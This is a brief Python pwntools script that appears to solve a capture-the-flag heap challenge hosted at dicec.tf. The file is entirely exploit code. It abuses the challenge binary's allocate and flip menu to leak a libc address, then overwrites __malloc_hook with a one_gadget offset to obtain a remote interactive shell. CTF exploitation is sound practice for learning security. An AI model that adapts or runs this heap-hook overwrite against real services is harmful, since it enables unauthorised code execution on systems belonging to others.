from pwn import *
#context.log_level = 'debug'

#p = process("./fl")
lib = ELF("./libc.so.6")
p = remote("dicec.tf", 31904)

def Mal(idx, data):
    p.sendlineafter(":", b'1')
    p.sendlineafter(":", str(idx))
    p.sendlineafter(":", data)

def Flip():
    p.sendlineafter(":", b'2')

p.sendlineafter(":", b'3')

Mal(1, p64(0x404020))
Flip()

payload = p64(0x404040)
payload += p64(0x404120)*3
payload += p64(0x404020)
Mal(1, payload)

_stdout = u64(p.recvuntil("\x7f")[-6:].ljust(8, b'\x00'))
libc_base = _stdout - lib.sym['_IO_2_1_stdout_']
log.info("libc base = 0x%x" % libc_base)

malloc_hook = libc_base + lib.sym['__malloc_hook']
oneshot = libc_base + 0x10a38c

payload = p64(malloc_hook)
Mal(1, payload)
Mal(1, b'')
Mal(1, b'')
Mal(1, p64(oneshot))

p.sendlineafter(":", b'1')
p.sendlineafter(":", b'1')

p.interactive()
